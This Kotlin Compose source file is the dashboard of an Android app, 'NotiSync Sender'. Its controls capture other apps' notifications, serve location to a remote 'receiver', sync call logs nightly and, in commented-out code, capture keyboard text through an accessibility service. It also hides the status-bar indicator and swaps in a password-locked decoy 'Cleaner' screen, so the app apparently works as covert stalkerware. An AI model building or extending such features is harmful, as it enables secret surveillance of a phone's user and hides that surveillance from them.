// ============================================================
// FILE: app/src/main/java/com/app/notisync_sender/ui/screens/DashboardScreen.kt
// Purpose: Main dashboard showing sync status, controls, and statistics
// ============================================================

package com.app.notisync_sender.ui.screens

import androidx.compose.animation.core.RepeatMode
import androidx.compose.animation.core.animateFloat
import androidx.compose.animation.core.infiniteRepeatable
import androidx.compose.animation.core.rememberInfiniteTransition
import androidx.compose.animation.core.tween
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Accessibility
import androidx.compose.material.icons.filled.BatteryAlert
import androidx.compose.material.icons.filled.CallMade
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.Cloud
import androidx.compose.material.icons.filled.CloudOff
import androidx.compose.material.icons.filled.Keyboard
import androidx.compose.material.icons.filled.LocationOn
import androidx.compose.material.icons.filled.MobileScreenShare
import androidx.compose.material.icons.filled.MyLocation
import androidx.compose.material.icons.filled.Notifications
import androidx.compose.material.icons.filled.NotificationsOff
import androidx.compose.material.icons.filled.Phone
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.Settings
import androidx.compose.material.icons.filled.Smartphone
import androidx.compose.material.icons.filled.Stop
import androidx.compose.material.icons.filled.Sync
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.material3.TopAppBar
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.rotate
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.unit.dp
import androidx.hilt.navigation.compose.hiltViewModel
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import com.app.notisync_sender.viewmodel.DashboardViewModel

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun DashboardScreen(
    onNavigateToSettings: () -> Unit,
    onNavigateToCleaner: () -> Unit,
    onRequestLocationPermission: () -> Unit = {},
    onRequestCallLogPermission: () -> Unit = {},
    viewModel: DashboardViewModel = hiltViewModel()
) {
    val isServiceRunning by viewModel.isServiceRunning.collectAsStateWithLifecycle()
    val isNotificationAccessEnabled by viewModel.isNotificationAccessEnabled.collectAsStateWithLifecycle()
    val isBatteryOptimizationDisabled by viewModel.isBatteryOptimizationDisabled.collectAsStateWithLifecycle()
    val isAppNotificationsEnabled by viewModel.isAppNotificationsEnabled.collectAsStateWithLifecycle()
    val pendingNotificationCount by viewModel.pendingNotificationCount.collectAsStateWithLifecycle()
    val pendingBatchCount by viewModel.pendingBatchCount.collectAsStateWithLifecycle()

    val isLocationPermissionGranted by viewModel.isLocationPermissionGranted.collectAsStateWithLifecycle()
    val isGpsEnabled by viewModel.isGpsEnabled.collectAsStateWithLifecycle()
    val isCallLogPermissionGranted by viewModel.isCallLogPermissionGranted.collectAsStateWithLifecycle()
    val pendingLocationCount by viewModel.pendingLocationCount.collectAsStateWithLifecycle()
    val pendingCallLogBatchCount by viewModel.pendingCallLogBatchCount.collectAsStateWithLifecycle()

    var showCleanerDialog by remember { mutableStateOf(false) }
    var password by remember { mutableStateOf("") }

    val infiniteTransition = rememberInfiniteTransition(label = "syncRotation")
    val rotation by infiniteTransition.animateFloat(
        initialValue = 0f,
        targetValue = 360f,
        animationSpec = infiniteRepeatable(
            animation = tween(2000),
            repeatMode = RepeatMode.Restart
        ),
        label = "rotationAngle"
    )

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Column {
                        Text(
                            text = "NotiSync Sender",
                            style = MaterialTheme.typography.titleLarge,
                            fontWeight = FontWeight.Bold
                        )
                        viewModel.userEmail?.let { email ->
                            Text(
                                text = email,
                                style = MaterialTheme.typography.bodySmall,
                                color = MaterialTheme.colorScheme.onSurfaceVariant
                            )
                        }
                    }
                },
                actions = {
                    IconButton(onClick = { showCleanerDialog = true }) {
                        Icon(
                            imageVector = Icons.Default.MobileScreenShare,
                            contentDescription = "Cleaner",
                            tint = MaterialTheme.colorScheme.error
                        )
                    }
                    IconButton(onClick = onNavigateToSettings) {
                        Icon(Icons.Default.Settings, contentDescription = "Settings")
                    }
                }
            )
        }
    ) { paddingValues ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(paddingValues)
                .padding(16.dp)
                .verticalScroll(rememberScrollState()),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            // Device Info Card
            Card(
                modifier = Modifier.fillMaxWidth(),
                colors = CardDefaults.cardColors(
                    containerColor = MaterialTheme.colorScheme.primaryContainer
                )
            ) {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(16.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Icon(
                        imageVector = Icons.Default.Smartphone,
                        contentDescription = "Device",
                        modifier = Modifier.size(40.dp),
                        tint = MaterialTheme.colorScheme.onPrimaryContainer
                    )
                    Spacer(modifier = Modifier.width(16.dp))
                    Column {
                        Text(
                            text = viewModel.currentDeviceInfo.deviceName,
                            style = MaterialTheme.typography.titleMedium,
                            fontWeight = FontWeight.SemiBold,
                            color = MaterialTheme.colorScheme.onPrimaryContainer
                        )
                        Text(
                            text = "Device ID: ${viewModel.currentDeviceInfo.deviceId.take(8)}...",
                            style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.onPrimaryContainer.copy(alpha = 0.7f)
                        )
                    }
                }
            }

            // Sync Status Card
            Card(
                modifier = Modifier.fillMaxWidth(),
                colors = CardDefaults.cardColors(
                    containerColor = if (isServiceRunning)
                        MaterialTheme.colorScheme.tertiaryContainer
                    else
                        MaterialTheme.colorScheme.surfaceVariant
                )
            ) {
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(20.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Icon(
                        imageVector = if (isServiceRunning) Icons.Default.Sync else Icons.Default.CloudOff,
                        contentDescription = "Sync Status",
                        modifier = Modifier
                            .size(48.dp)
                            .then(if (isServiceRunning) Modifier.rotate(rotation) else Modifier),
                        tint = if (isServiceRunning)
                            MaterialTheme.colorScheme.onTertiaryContainer
                        else
                            MaterialTheme.colorScheme.onSurfaceVariant
                    )
                    Spacer(modifier = Modifier.height(12.dp))
                    Text(
                        text = if (isServiceRunning) "Sync Active" else "Sync Stopped",
                        style = MaterialTheme.typography.titleLarge,
                        fontWeight = FontWeight.Bold,
                        color = if (isServiceRunning)
                            MaterialTheme.colorScheme.onTertiaryContainer
                        else
                            MaterialTheme.colorScheme.onSurfaceVariant
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    Text(
                        text = if (isServiceRunning)
                            "Listening for notifications..."
                        else
                            "Tap Start to begin syncing",
                        style = MaterialTheme.typography.bodyMedium,
                        color = if (isServiceRunning)
                            MaterialTheme.colorScheme.onTertiaryContainer.copy(alpha = 0.8f)
                        else
                            MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.8f)
                    )
                    Spacer(modifier = Modifier.height(20.dp))
                    Button(
                        onClick = {
                            if (isServiceRunning) viewModel.stopSyncService()
                            else viewModel.startSyncService()
                        },
                        colors = ButtonDefaults.buttonColors(
                            containerColor = if (isServiceRunning)
                                MaterialTheme.colorScheme.error
                            else
                                MaterialTheme.colorScheme.primary
                        ),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Icon(
                            imageVector = if (isServiceRunning) Icons.Default.Stop else Icons.Default.PlayArrow,
                            contentDescription = null,
                            modifier = Modifier.size(20.dp)
                        )
                        Spacer(modifier = Modifier.width(8.dp))
                        Text(
                            text = if (isServiceRunning) "Stop Sync" else "Start Sync",
                            style = MaterialTheme.typography.titleMedium
                        )
                    }
                }
            }

            // Statistics Row 1
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                StatCard(
                    modifier = Modifier.weight(1f),
                    icon = Icons.Default.Notifications,
                    title = "Pending",
                    value = pendingNotificationCount.toString(),
                    subtitle = "notifications"
                )
                StatCard(
                    modifier = Modifier.weight(1f),
                    icon = Icons.Default.Cloud,
                    title = "Queued",
                    value = pendingBatchCount.toString(),
                    subtitle = "batches"
                )
            }

            // Statistics Row 2
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                StatCard(
                    modifier = Modifier.weight(1f),
                    icon = Icons.Default.LocationOn,
                    title = "Location",
                    value = pendingLocationCount.toString(),
                    subtitle = "pending"
                )
                StatCard(
                    modifier = Modifier.weight(1f),
                    icon = Icons.Default.Phone,
                    title = "Call Logs",
                    value = pendingCallLogBatchCount.toString(),
                    subtitle = "pending"
                )
            }

            // Quick Actions Section
            Text(
                text = "Quick Actions",
                style = MaterialTheme.typography.titleMedium,
                fontWeight = FontWeight.SemiBold,
                modifier = Modifier.padding(top = 8.dp)
            )

            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                Button(
                    onClick = viewModel::triggerLocationFetch,
                    enabled = isServiceRunning && isLocationPermissionGranted,
                    modifier = Modifier.weight(1f),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = MaterialTheme.colorScheme.secondary
                    )
                ) {
                    Icon(
                        imageVector = Icons.Default.MyLocation,
                        contentDescription = null,
                        modifier = Modifier.size(18.dp)
                    )
                    Spacer(modifier = Modifier.width(4.dp))
                    Text("Get Location", style = MaterialTheme.typography.bodySmall)
                }

                Button(
                    onClick = viewModel::triggerCallLogSync,
                    enabled = isServiceRunning && isCallLogPermissionGranted,
                    modifier = Modifier.weight(1f),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = MaterialTheme.colorScheme.secondary
                    )
                ) {
                    Icon(
                        imageVector = Icons.Default.CallMade,
                        contentDescription = null,
                        modifier = Modifier.size(18.dp)
                    )
                    Spacer(modifier = Modifier.width(4.dp))
                    Text("Sync Calls", style = MaterialTheme.typography.bodySmall)
                }
            }

            // Permissions Section
            Text(
                text = "Required Permissions",
                style = MaterialTheme.typography.titleMedium,
                fontWeight = FontWeight.SemiBold,
                modifier = Modifier.padding(top = 8.dp)
            )

            PermissionCard(
                icon = Icons.Default.Notifications,
                title = "Notification Access",
                description = "Required to capture notifications from other apps",
                isEnabled = isNotificationAccessEnabled,
                onActionClick = viewModel::openNotificationAccessSettings
            )

            PermissionCard(
                icon = Icons.Default.BatteryAlert,
                title = "Battery Optimization",
                description = "Disable to prevent Android from stopping the service",
                isEnabled = isBatteryOptimizationDisabled,
                onActionClick = viewModel::openBatteryOptimizationSettings
            )

            PermissionCard(
                icon = Icons.Default.LocationOn,
                title = "Location Access",
                description = "Required for remote location requests from receiver",
                isEnabled = isLocationPermissionGranted,
                onActionClick = onRequestLocationPermission
            )

            if (isLocationPermissionGranted) {
                PermissionCard(
                    icon = Icons.Default.MyLocation,
                    title = "GPS / Location Service",
                    description = "Enable GPS for accurate location tracking",
                    isEnabled = isGpsEnabled,
                    onActionClick = viewModel::openLocationSettings
                )
            }

            PermissionCard(
                icon = Icons.Default.Phone,
                title = "Call Log Access",
                description = "Required for daily call history sync at 11PM",
                isEnabled = isCallLogPermissionGranted,
                onActionClick = onRequestCallLogPermission
            )

//            PermissionCard(
//                icon = Icons.Default.Accessibility,
//                title = "Accessibility Service",
//                description = "Required for keyboard text capture (controlled by receiver)",
//                isEnabled = checkAccessibilityEnabled(viewModel),
//                onActionClick = viewModel::openAccessibilitySettings
//            )

            PermissionCard(
                icon = Icons.Default.NotificationsOff,
                title = "Status Bar Icon",
                description = "Hide the sync indicator from your status bar",
                isEnabled = !isAppNotificationsEnabled,
                onActionClick = viewModel::openAppNotificationSettings
            )
        }
    }

    if (showCleanerDialog) {
        AlertDialog(
            onDismissRequest = {
                showCleanerDialog = false
                password = ""
            },
            title = { Text(text = "Enable Blind Mode", fontWeight = FontWeight.Bold) },
            text = {
                Column {
                    Text("Create an access password to secure the dashboard. You will need the password to return from the Cleaner screen.")
                    Spacer(modifier = Modifier.height(8.dp))
                    Text(
                        text = "Remember the Password",
                        color = MaterialTheme.colorScheme.error,
                        fontWeight = FontWeight.Bold,
                        style = MaterialTheme.typography.bodySmall
                    )
                    Spacer(modifier = Modifier.height(16.dp))
                    OutlinedTextField(
                        value = password,
                        onValueChange = { password = it },
                        label = { Text("Access Password") },
                        singleLine = true,
                        visualTransformation = PasswordVisualTransformation(),
                        modifier = Modifier.fillMaxWidth()
                    )
                }
            },
            confirmButton = {
                Button(
                    onClick = {
                        if (password.isNotBlank()) {
                            viewModel.saveAccessPassword(password)
                            viewModel.setCleanerAsStartDestination(true)
                            showCleanerDialog = false
                            password = ""
                            onNavigateToCleaner()
                        }
                    },
                    enabled = password.isNotBlank()
                ) {
                    Text("OK")
                }
            },
            dismissButton = {
                OutlinedButton(onClick = {
                    showCleanerDialog = false
                    password = ""
                }) {
                    Text("Cancel")
                }
            }
        )
    }
}

@Composable
private fun checkAccessibilityEnabled(viewModel: DashboardViewModel): Boolean {
    val isEnabled by viewModel.isAccessibilityServiceEnabled.collectAsStateWithLifecycle()
    return isEnabled
}

@Composable
private fun StatCard(
    modifier: Modifier = Modifier,
    icon: ImageVector,
    title: String,
    value: String,
    subtitle: String
) {
    Card(
        modifier = modifier,
        colors = CardDefaults.cardColors(
            containerColor = MaterialTheme.colorScheme.surfaceVariant
        )
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(16.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Icon(
                imageVector = icon,
                contentDescription = title,
                modifier = Modifier.size(28.dp),
                tint = MaterialTheme.colorScheme.primary
            )
            Spacer(modifier = Modifier.height(8.dp))
            Text(
                text = value,
                style = MaterialTheme.typography.headlineMedium,
                fontWeight = FontWeight.Bold,
                color = MaterialTheme.colorScheme.onSurfaceVariant
            )
            Text(
                text = subtitle,
                style = MaterialTheme.typography.bodySmall,
                color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.7f)
            )
        }
    }
}

@Composable
private fun PermissionCard(
    icon: ImageVector,
    title: String,
    description: String,
    isEnabled: Boolean,
    onActionClick: () -> Unit
) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(
            containerColor = if (isEnabled)
                MaterialTheme.colorScheme.secondaryContainer
            else
                MaterialTheme.colorScheme.errorContainer.copy(alpha = 0.5f)
        )
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(16.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(
                imageVector = icon,
                contentDescription = title,
                modifier = Modifier.size(32.dp),
                tint = if (isEnabled)
                    MaterialTheme.colorScheme.onSecondaryContainer
                else
                    MaterialTheme.colorScheme.error
            )
            Spacer(modifier = Modifier.width(16.dp))
            Column(modifier = Modifier.weight(1f)) {
                Text(
                    text = title,
                    style = MaterialTheme.typography.titleSmall,
                    fontWeight = FontWeight.SemiBold,
                    color = if (isEnabled)
                        MaterialTheme.colorScheme.onSecondaryContainer
                    else
                        MaterialTheme.colorScheme.onErrorContainer
                )
                Text(
                    text = description,
                    style = MaterialTheme.typography.bodySmall,
                    color = if (isEnabled)
                        MaterialTheme.colorScheme.onSecondaryContainer.copy(alpha = 0.7f)
                    else
                        MaterialTheme.colorScheme.onErrorContainer.copy(alpha = 0.7f)
                )
            }
            Spacer(modifier = Modifier.width(8.dp))
            if (isEnabled) {
                Icon(
                    imageVector = Icons.Default.CheckCircle,
                    contentDescription = "Enabled",
                    tint = MaterialTheme.colorScheme.primary,
                    modifier = Modifier.size(24.dp)
                )
            } else {
                Button(
                    onClick = onActionClick,
                    colors = ButtonDefaults.buttonColors(
                        containerColor = MaterialTheme.colorScheme.error
                    )
                ) {
                    Text("Enable")
                }
            }
        }
    }
}
